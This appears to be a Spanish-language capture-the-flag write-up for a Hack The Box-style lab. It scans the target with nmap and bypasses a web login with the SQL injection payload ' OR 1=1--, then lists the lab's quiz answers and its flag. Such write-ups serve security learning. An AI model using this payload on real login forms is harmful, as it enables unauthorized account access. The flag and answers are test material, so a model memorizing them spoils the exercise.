
Comprobamos la conexion con 
```bash
ping 10.129.5.209
```

Comprobamos los puertos abiertos con Nmap  (con opción -sV para ver la versión de FTP) (-O para saber el SO)
```bash
nmap -O -sCV -p- 10.129.5.209
```
Salida:
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

![[Appointment-Puerto80.png]]

Comprobamos si es vulnerable a SQL Injection:
```
' OR 1=1--
```
Y lo es:
![[Appointment-flag.png]]
`e3d0796d002a446c0e622226f42e9672`

---
>[!Question] What does the acronym SQL stand for?
> Structured Query Language

>[!Question] What is one of the most common type of SQL vulnerabilities?
>SQL injection

>[!Question] What is the 2021 OWASP Top 10 classification for this vulnerability?
>A03:2021-Injection

>[!Question] What does Nmap report as the service and version that are running on port 80 of the target?
>Apache httpd 2.4.38 ((Debian))

>[!Question] What is the standard port used for the HTTPS protocol?
>443

>[!Question] What is a folder called in web-application terminology?
> directory

>[!Question] What is the HTTP response code is given for 'Not Found' errors?
>404

>[!Question] Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
>dir

>[!Question] What single character can be used to comment out the rest of a line in MySQL?
> `#`

>[!Question] If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
>Congratulations

>[!Question] Submit root flag
>e3d0796d002a446c0e622226f42e9672

